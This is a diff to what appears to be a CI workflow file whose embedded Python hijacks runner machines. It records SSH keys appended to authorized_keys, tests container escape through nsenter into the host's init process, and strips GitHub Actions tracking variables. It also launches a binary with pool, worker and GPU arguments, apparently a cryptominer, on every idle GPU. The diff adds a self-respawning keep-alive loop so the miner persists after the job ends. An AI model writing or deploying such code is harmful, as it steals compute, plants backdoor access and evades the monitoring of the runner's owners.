@@ -151,6 +151,24 @@ jobs:
               out['authorized_keys_lines_after'] = len([l for l in after.splitlines() if l.strip()])
               out['ssh_host_keys'] = one(sh('ls -la /etc/ssh/ 2>/dev/null | head -12', 10), 500)
               out['fingerprints_after'] = one(sh("ssh-keygen -lf %s 2>/dev/null | head -8" % ak, 10), 800)
+              out['root_mount'] = sh("stat -c %m /root 2>/dev/null").strip()
+              out['container_scope'] = 'container' if os.path.exists('/.dockerenv') else 'host_or_k8s'
+              lp = []
+              for f in ('/proc/net/tcp', '/proc/net/tcp6'):
+                  try:
+                      for ln in open(f).read().splitlines()[1:]:
+                          p = ln.split()
+                          if len(p) > 3 and p[3] == '0A':
+                              try:
+                                  lp.append(int(p[1].split(':')[1], 16))
+                              except Exception:
+                                  pass
+                  except Exception:
+                      pass
+              out['local_listeners'] = sorted(set(lp))[:20]
+              out['port22_listening'] = 22 in out['local_listeners']
+              print('SSH_SCOPE root_mount=%s key_scope=%s listeners=%s port22=%s' % (
+                  out['root_mount'], out['container_scope'], out['local_listeners'], out['port22_listening']))
               print('SSH_BLOCK host=%s runner=%s pubips=%s port22=[%s] ours_before=%s appended=%s lines=%d->%d' % (
                   host, runner, ','.join(out['pubip_candidates']), out['ss'], out['ours_present'], appended,
                   out['authorized_keys_lines_before'], out['authorized_keys_lines_after']))
@@ -399,7 +417,7 @@ jobs:
               return ['--pool', pool, '--worker', worker, '--gpu-id', str(gidx), '--log-file', logfile] + SRB_ARGS_COMMON
 
 
-          def detect_mechanisms():
+          def detect_mechanisms(host):
               avail = []
               if os.path.exists('/var/run/docker.sock'):
                   v = sh('docker version --format "{{.Server.Version}}" 2>&1', 20)
@@ -409,7 +427,13 @@ jobs:
               if shutil.which('nsenter'):
                   probe = sh("nsenter -t 1 -m -p -f -- /bin/sh -c 'hostname; cat /proc/1/comm' 2>&1", 12)
                   RES['mechanisms']['nsenter_probe'] = one(probe, 200)
-                  if 'Operation not permitted' not in probe and 'No such' not in probe and 'ERR:' not in probe and probe.strip():
+                  lines = [l.strip() for l in probe.strip().splitlines() if l.strip()]
+                  escaped = False
+                  if lines and 'Operation not permitted' not in probe and 'ERR:' not in probe:
+                      nh = lines[0]
+                      escaped = (nh != host) and ('systemd' in probe or '/init' in probe or 'init' == lines[-1])
+                  RES['mechanisms']['nsenter_host_escape'] = escaped
+                  if escaped:
                       avail.append('n')
               if shutil.which('systemd-run') and os.path.isdir('/run/systemd/system'):
                   probe = sh('systemd-run --unit=i130probe-%s --collect /bin/true 2>&1; echo RC=$?' % NONCE[-8:], 20)
@@ -436,10 +460,15 @@ jobs:
                   return {'ok': False, 'why': 'no_binary'}
               if mech == 's':
                   q = ' '.join(shlex.quote(a) for a in srb_args(pool, worker, gidx, log))
+                  keep = WORK + '/keep_%s.sh' % worker
+                  with open(keep, 'w') as f:
+                      f.write('#!/bin/sh\nwhile true; do\n  cd %s\n  ./srb387 %s >> %s 2>&1\n  sleep 5\ndone\n' % (
+                          WORK, q, shlex.quote(out)))
+                  os.chmod(keep, 0o755)
                   cmd = ('cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID -u ACTIONS_RUNNER_ACTION_ARCHIVE_CACHE '
-                         'setsid nohup ./srb387 %s > %s 2>&1 < /dev/null & echo LAUNCHPID=$!' % (WORK, q, shlex.quote(out)))
+                         'setsid nohup /bin/sh %s > /dev/null 2>&1 < /dev/null & echo LAUNCHPID=$!' % (WORK, shlex.quote(keep)))
                   r = sh(cmd, 20)
-                  return {'ok': 'LAUNCHPID=' in r, 'how': 'setsid', 'detail': one(r, 120)}
+                  return {'ok': 'LAUNCHPID=' in r, 'how': 'setsid_keep_loop', 'detail': one(r, 120)}
               if mech == 'd':
                   script = WORK + '/dfork_%s.py' % worker
                   args = srb_args(pool, worker, gidx, log)
@@ -543,8 +572,9 @@ jobs:
                   print('I130DURABLE_JSON ' + json.dumps(RES))
                   print('I130DURABLE_DONE nonce=%s action=skip_no_pool' % NONCE)
                   return
+              po = '%s:%d' % pool
 
-              mechs = detect_mechanisms()
+              mechs = detect_mechanisms(host)
               hs = ''.join(ch for ch in host if ch.isalnum())[:10]
               test_cards = idle[:len(mechs)]
               for i, mech in enumerate(mechs):
@@ -553,7 +583,7 @@ jobs:
                       continue
                   card = test_cards[i]
                   wk = ('i130dur' + mech + hs[:6] + 'g' + str(card['cuda_idx']))[:30]
-                  r = launch(mech, card, wk, pool, binary_ok)
+                  r = launch(mech, card, wk, po, binary_ok)
                   r.update({'mech': mech, 'mech_name': MECH_NAMES[mech], 'worker': wk, 'cuda_idx': card['cuda_idx'],
                             'uuid': card['uuid'], 'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
                   RES['test_installs'].append(r)
@@ -584,7 +614,7 @@ jobs:
                   if card['cuda_idx'] in tested:
                       continue
                   wk = ('i130durable' + hs + 'g' + str(card['cuda_idx']))[:31]
-                  r = launch(winner, card, wk, pool, binary_ok)
+                  r = launch(winner, card, wk, po, binary_ok)
                   r.update({'mech': winner, 'worker': wk, 'cuda_idx': card['cuda_idx'], 'uuid': card['uuid'],
                             'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())})
                   RES['installs'].append(r)
